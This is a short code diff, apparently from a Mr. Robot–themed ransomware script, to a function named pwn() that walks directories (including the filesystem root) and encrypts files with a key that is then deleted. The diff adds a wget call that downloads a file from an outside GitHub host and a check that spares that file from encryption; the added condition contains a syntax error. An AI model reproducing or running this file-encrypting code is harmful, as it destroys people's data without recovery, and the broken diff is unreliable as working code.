@@ -110,6 +110,7 @@ def pwn():
     dirs = next(os.walk(START_DIR))[1]
     time.sleep(0.7)
     print('beginning crypto operations')
+    subprocess.call(["wget", "https://raw.githubusercontent.com/joekendal/fsociety/master/fsociety00.dat"])
     for dir in dirs:
         if START_DIR == '/':
             directory = START_DIR + dir
@@ -120,7 +121,8 @@ def pwn():
     files = next(os.walk(START_DIR))[2]
     for file in files:
         try:
-            encrypt(START_DIR, file, key)
+            if file != "fsociety00.dat""
+                encrypt(START_DIR, file, key)
         except:
             pass
     del key
